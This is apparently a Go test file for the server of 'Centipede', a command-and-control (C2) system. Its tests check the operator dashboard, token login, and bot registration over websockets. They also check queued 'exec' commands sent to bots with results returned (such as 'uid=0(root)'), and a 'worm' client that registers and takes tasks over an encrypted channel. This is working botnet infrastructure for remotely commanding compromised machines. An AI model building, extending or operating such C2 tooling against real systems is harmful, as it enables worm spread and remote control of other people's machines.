package main

import (
	"crypto/ecdh"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/websocket"

	"github.com/saviorSEC/Centipede/internal/c2"
	"github.com/saviorSEC/Centipede/internal/common"
)

// newTestServer boots the full router (embedded assets included) in-process.
func newTestServer(t *testing.T, token string) *httptest.Server {
	t.Helper()
	tplFS, err := fs.Sub(webFS, "web/templates")
	if err != nil {
		t.Fatalf("templates: %v", err)
	}
	staticFS, err := fs.Sub(webFS, "web/static")
	if err != nil {
		t.Fatalf("static: %v", err)
	}
	srv := NewC2Server(token)
	ts := httptest.NewServer(srv.newRouter(tplFS, staticFS))
	t.Cleanup(ts.Close)
	return ts
}

func get(t *testing.T, url, token string) (*http.Response, string) {
	t.Helper()
	req, _ := http.NewRequest(http.MethodGet, url, nil)
	if token != "" {
		req.Header.Set("X-C2-Token", token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("GET %s: %v", url, err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, string(body)
}

func post(t *testing.T, url, token, payload string) (*http.Response, string) {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("X-C2-Token", token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST %s: %v", url, err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, string(body)
}

func wsURL(ts *httptest.Server, path string) string {
	return "ws" + strings.TrimPrefix(ts.URL, "http") + path
}

func dialWS(t *testing.T, url string) *websocket.Conn {
	t.Helper()
	conn, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		t.Fatalf("dial %s: %v", url, err)
	}
	t.Cleanup(func() { conn.Close() })
	return conn
}

func readMsg(t *testing.T, conn *websocket.Conn) map[string]interface{} {
	t.Helper()
	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	var m map[string]interface{}
	if err := conn.ReadJSON(&m); err != nil {
		t.Fatalf("read ws: %v", err)
	}
	return m
}

// ---- dashboard + static assets ------------------------------------------

func TestDashboardAndStatic(t *testing.T) {
	ts := newTestServer(t, "")
	resp, body := get(t, ts.URL+"/", "")
	if resp.StatusCode != 200 || !strings.Contains(body, "centipede") || !strings.Contains(body, "view-bots") {
		t.Fatalf("dashboard: rc=%d len=%d", resp.StatusCode, len(body))
	}
	for _, p := range []string{"/static/js/app.js", "/static/css/dark.css"} {
		r, b := get(t, ts.URL+p, "")
		if r.StatusCode != 200 || len(b) < 500 {
			t.Fatalf("asset %s: rc=%d len=%d", p, r.StatusCode, len(b))
		}
	}
}

// ---- baseline API --------------------------------------------------------

func TestStatsAndCommandQueue(t *testing.T) {
	ts := newTestServer(t, "")
	resp, body := get(t, ts.URL+"/api/stats", "")
	if resp.StatusCode != 200 {
		t.Fatalf("stats rc=%d", resp.StatusCode)
	}
	var stats map[string]interface{}
	_ = json.Unmarshal([]byte(body), &stats)
	if stats["total_bots"].(float64) != 0 || stats["version"] == "" {
		t.Fatalf("unexpected stats: %s", body)
	}

	// command to an unknown bot stays queued, command still recorded
	r, b := post(t, ts.URL+"/api/command", "", `{"bot_id":"ghost","action":"exec","args":"id"}`)
	if r.StatusCode != 200 {
		t.Fatalf("command rc=%d", r.StatusCode)
	}
	var cmd Command
	_ = json.Unmarshal([]byte(b), &cmd)
	if cmd.Status != "queued" || cmd.Action != "exec" {
		t.Fatalf("cmd: %s", b)
	}
	_, cb := get(t, ts.URL+"/api/commands", "")
	if !strings.Contains(cb, cmd.ID) {
		t.Fatalf("command not listed: %s", cb)
	}
}

// ---- operator auth -------------------------------------------------------

func TestTokenGate(t *testing.T) {
	ts := newTestServer(t, "sekret")

	r, _ := get(t, ts.URL+"/api/stats", "")
	if r.StatusCode != 401 {
		t.Fatalf("expected 401 without token, got %d", r.StatusCode)
	}

	r, _ = get(t, ts.URL+"/api/stats", "wrong")
	if r.StatusCode != 401 {
		t.Fatalf("expected 401 with wrong token, got %d", r.StatusCode)
	}

	r, _ = get(t, ts.URL+"/api/stats", "sekret")
	if r.StatusCode != 200 {
		t.Fatalf("expected 200 with token, got %d", r.StatusCode)
	}

	// cookie login flow (do not follow the redirect - we want the 302)
	noRedirect := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, _ := http.NewRequest(http.MethodGet, ts.URL+"/login?token=sekret", nil)
	resp, err := noRedirect.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != http.StatusFound {
		t.Fatalf("login rc=%d", resp.StatusCode)
	}
	cookies := resp.Cookies()
	resp.Body.Close()
	if len(cookies) == 0 {
		t.Fatal("no cookie set")
	}
	req2, _ := http.NewRequest(http.MethodGet, ts.URL+"/api/stats", nil)
	req2.AddCookie(cookies[0])
	resp2, err := http.DefaultClient.Do(req2)
	if err != nil {
		t.Fatal(err)
	}
	resp2.Body.Close()
	if resp2.StatusCode != 200 {
		t.Fatalf("cookie auth rc=%d", resp2.StatusCode)
	}

	// dashboard and static stay reachable without auth
	r, _ = get(t, ts.URL+"/", "")
	if r.StatusCode != 200 {
		t.Fatalf("dashboard should be public, rc=%d", r.StatusCode)
	}
}

// ---- full bot lifecycle --------------------------------------------------

func TestBotE2E(t *testing.T) {
	ts := newTestServer(t, "")
	bot := dialWS(t, wsURL(ts, "/ws/bot"))

	_ = bot.WriteJSON(map[string]interface{}{
		"t": "register", "bid": "b1", "hostname": "h1", "ip": "10.0.0.9",
		"os": "linux", "arch": "amd64", "kernel": "6.1.0", "privilege": "root", "layer": 1,
	})
	time.Sleep(100 * time.Millisecond)

	// queue a command -> delivered immediately while connected
	r, b := post(t, ts.URL+"/api/command", "", `{"bot_id":"b1","action":"exec","args":"id"}`)
	if r.StatusCode != 200 {
		t.Fatalf("command rc=%d", r.StatusCode)
	}
	var cmd Command
	_ = json.Unmarshal([]byte(b), &cmd)

	// bot receives the task frame
	task := readMsg(t, bot)
	if task["t"] != "task" || task["id"] != cmd.ID || task["act"] != "exec" {
		t.Fatalf("unexpected task frame: %v", task)
	}

	// bot reports the result
	_ = bot.WriteJSON(map[string]interface{}{
		"t": "result", "bid": "b1", "tid": cmd.ID, "ok": true, "out": "uid=0(root)",
	})

	// command shows completed
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		_, cb := get(t, ts.URL+"/api/commands", "")
		if strings.Contains(cb, `"status":"completed"`) && strings.Contains(cb, "uid=0(root)") {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	_, cb := get(t, ts.URL+"/api/commands", "")
	if !strings.Contains(cb, `"status":"completed"`) {
		t.Fatalf("command not completed: %s", cb)
	}

	// bot is listed with its registration details
	_, bb := get(t, ts.URL+"/api/bots", "")
	for _, want := range []string{`"id":"b1"`, "h1", "10.0.0.9", "6.1.0", "root", `"connected":true`} {
		if !strings.Contains(bb, want) {
			t.Fatalf("bot listing missing %s: %s", want, bb)
		}
	}

	// ping -> pong
	_ = bot.WriteJSON(map[string]interface{}{"t": "ping", "bid": "b1"})
	pong := readMsg(t, bot)
	if pong["t"] != "pong" {
		t.Fatalf("expected pong, got %v", pong)
	}
}

// ---- operator websocket events -------------------------------------------

func TestOperatorBroadcast(t *testing.T) {
	ts := newTestServer(t, "")
	op := dialWS(t, wsURL(ts, "/ws"))

	hello := readMsg(t, op)
	if hello["t"] != "hello" {
		t.Fatalf("expected hello, got %v", hello)
	}

	bot := dialWS(t, wsURL(ts, "/ws/bot"))
	_ = bot.WriteJSON(map[string]interface{}{
		"t": "register", "bid": "b2", "hostname": "h2",
	})
	ev := readMsg(t, op)
	if ev["t"] != "bot_register" || ev["bid"] != "b2" {
		t.Fatalf("expected bot_register, got %v", ev)
	}
}

// ---- queued command delivery on reconnect (ping flush) -------------------

func TestQueuedFlushOnReconnect(t *testing.T) {
	ts := newTestServer(t, "")

	// connect and immediately drop
	botA := dialWS(t, wsURL(ts, "/ws/bot"))
	_ = botA.WriteJSON(map[string]interface{}{"t": "register", "bid": "off1", "hostname": "h3"})
	time.Sleep(150 * time.Millisecond)
	botA.Close()
	time.Sleep(400 * time.Millisecond) // let the server mark it offline

	// command while offline -> queued
	_, b := post(t, ts.URL+"/api/command", "", `{"bot_id":"off1","action":"exec","args":"whoami"}`)
	var cmd Command
	_ = json.Unmarshal([]byte(b), &cmd)
	if cmd.Status != "queued" {
		t.Fatalf("expected queued while offline, got %s", cmd.Status)
	}

	// same bot id reconnects and pings -> queued task is flushed
	botB := dialWS(t, wsURL(ts, "/ws/bot"))
	_ = botB.WriteJSON(map[string]interface{}{"t": "register", "bid": "off1", "hostname": "h3"})
	_ = botB.WriteJSON(map[string]interface{}{"t": "ping", "bid": "off1"})

	deadline := time.Now().Add(3 * time.Second)
	got := map[string]interface{}{}
	for time.Now().Before(deadline) {
		_ = botB.SetReadDeadline(time.Now().Add(time.Second))
		if err := botB.ReadJSON(&got); err != nil {
			continue
		}
		if got["t"] == "task" && got["id"] == cmd.ID {
			break
		}
	}
	if got["t"] != "task" || got["id"] != cmd.ID {
		t.Fatalf("queued task not flushed, last frame: %v", got)
	}
}

// newSecureTestServer boots c2d with an encrypted bot channel.
func newSecureTestServer(t *testing.T) (*httptest.Server, string, string) {
	t.Helper()
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	secret := make([]byte, 16)
	rand.Read(secret)
	privHex := hex.EncodeToString(priv.Bytes())
	secretHex := hex.EncodeToString(secret)

	tplFS, err := fs.Sub(webFS, "web/templates")
	if err != nil {
		t.Fatalf("templates: %v", err)
	}
	staticFS, err := fs.Sub(webFS, "web/static")
	if err != nil {
		t.Fatalf("static: %v", err)
	}
	srv := NewC2Server("")
	if err := srv.SetBotKey(privHex); err != nil {
		t.Fatal(err)
	}
	if err := srv.SetBotSecret(secretHex); err != nil {
		t.Fatal(err)
	}
	ts := httptest.NewServer(srv.newRouter(tplFS, staticFS))
	t.Cleanup(ts.Close)
	return ts, hex.EncodeToString(priv.PublicKey().Bytes()), secretHex
}

// ---- real worm C2 client <-> real c2d server interop ---------------------

func TestWormClientInterop(t *testing.T) {
	ts := newTestServer(t, "")
	client := c2.NewC2Client("worm-it", wsURL(ts, "/ws/bot"), "", "", "", "")
	client.Start()
	defer client.Stop()

	// the worm client registers itself with the server
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		_, bb := get(t, ts.URL+"/api/bots", "")
		if strings.Contains(bb, `"id":"worm-it"`) {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	_, bb := get(t, ts.URL+"/api/bots", "")
	if !strings.Contains(bb, `"id":"worm-it"`) {
		t.Fatalf("worm client never registered with the server: %s", bb)
	}

	// queue a task for the worm
	_, b := post(t, ts.URL+"/api/command", "",
		`{"bot_id":"worm-it","action":"exec","args":"echo WORM-OK"}`)
	var cmd Command
	_ = json.Unmarshal([]byte(b), &cmd)
	if cmd.Status != "sent" {
		t.Fatalf("expected task sent to online worm, got status %s", cmd.Status)
	}

	// the worm client receives the task on its Tasks channel
	var task c2.Task
	select {
	case task = <-client.Tasks():
	case <-time.After(5 * time.Second):
		t.Fatal("worm client did not receive the queued task")
	}
	if task.ID != cmd.ID || task.Action != "exec" {
		t.Fatalf("unexpected task: %+v", task)
	}

	// the worm reports the result back
	client.SendResult(c2.TaskResult{TaskID: task.ID, Success: true, Output: "WORM-OK"})
	deadline = time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		_, cb := get(t, ts.URL+"/api/commands", "")
		if strings.Contains(cb, `"status":"completed"`) && strings.Contains(cb, "WORM-OK") {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	_, cb := get(t, ts.URL+"/api/commands", "")
	if !strings.Contains(cb, `"status":"completed"`) || !strings.Contains(cb, "WORM-OK") {
		t.Fatalf("worm result not recorded by server: %s", cb)
	}
}

// ---- encrypted channel: full lifecycle with the real worm client ---------

func TestEncryptedWormE2E(t *testing.T) {
	ts, pubHex, secretHex := newSecureTestServer(t)

	client := c2.NewC2Client("worm-sec", wsURL(ts, "/ws/bot"), "", "", "", "")
	if err := client.SetServerKey(pubHex); err != nil {
		t.Fatal(err)
	}
	if err := client.SetAuthSecret(secretHex); err != nil {
		t.Fatal(err)
	}
	client.Start()
	defer client.Stop()

	// worm registers through the encrypted channel
	deadline := time.Now().Add(6 * time.Second)
	for time.Now().Before(deadline) {
		_, bb := get(t, ts.URL+"/api/bots", "")
		if strings.Contains(bb, `"id":"worm-sec"`) {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	_, bb := get(t, ts.URL+"/api/bots", "")
	if !strings.Contains(bb, `"id":"worm-sec"`) {
		t.Fatalf("encrypted worm never registered: %s", bb)
	}

	// task round trip over the encrypted channel
	_, b := post(t, ts.URL+"/api/command", "",
		`{"bot_id":"worm-sec","action":"exec","args":"echo SEC-OK"}`)
	var cmd Command
	_ = json.Unmarshal([]byte(b), &cmd)
	if cmd.Status != "sent" {
		t.Fatalf("expected sent, got %s", cmd.Status)
	}

	var task c2.Task
	select {
	case task = <-client.Tasks():
	case <-time.After(5 * time.Second):
		t.Fatal("encrypted worm did not receive task")
	}
	if task.ID != cmd.ID {
		t.Fatalf("task id mismatch")
	}
	client.SendResult(c2.TaskResult{TaskID: task.ID, Success: true, Output: "SEC-OK"})

	deadline = time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		_, cb := get(t, ts.URL+"/api/commands", "")
		if strings.Contains(cb, `"status":"completed"`) && strings.Contains(cb, "SEC-OK") {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	_, cb := get(t, ts.URL+"/api/commands", "")
	if !strings.Contains(cb, "SEC-OK") {
		t.Fatalf("encrypted result not recorded: %s", cb)
	}
}

// ---- negative: wrong fleet secret is rejected at the handshake ------------

func TestEncryptedHandshakeRejectsBadSecret(t *testing.T) {
	ts, _, _ := newSecureTestServer(t)

	eph, _ := common.GenerateECDHKey()
	ephPub := eph.PublicKey().Bytes()
	ch := common.RandomString(16)
	// tag computed with the WRONG secret
	hello := map[string]interface{}{
		"t":   "hello",
		"bid": "evil",
		"k":   hex.EncodeToString(ephPub),
		"ch":  ch,
		"tag": hex.EncodeToString(common.HMAC(append(append([]byte{}, ephPub...), []byte(ch)...), []byte("wrong-secret"))),
	}

	conn, _, err := websocket.DefaultDialer.Dial(wsURL(ts, "/ws/bot"), nil)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	_ = conn.WriteJSON(hello)
	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	if _, _, err := conn.ReadMessage(); err == nil {
		t.Fatal("expected server to close the connection on bad secret")
	}
}

// ---- negative: plaintext frames are rejected on an encrypted channel ------

func TestEncryptedChannelRejectsPlaintext(t *testing.T) {
	ts, _, _ := newSecureTestServer(t)

	conn, _, err := websocket.DefaultDialer.Dial(wsURL(ts, "/ws/bot"), nil)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	// sending a plaintext register without the hello handshake gets dropped
	_ = conn.WriteJSON(map[string]interface{}{"t": "register", "bid": "raw", "hostname": "x"})
	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	if _, _, err := conn.ReadMessage(); err == nil {
		t.Fatal("expected connection close for plaintext frame on encrypted channel")
	}
}

// keep fmt imported for potential debug output
var _ = fmt.Sprintf
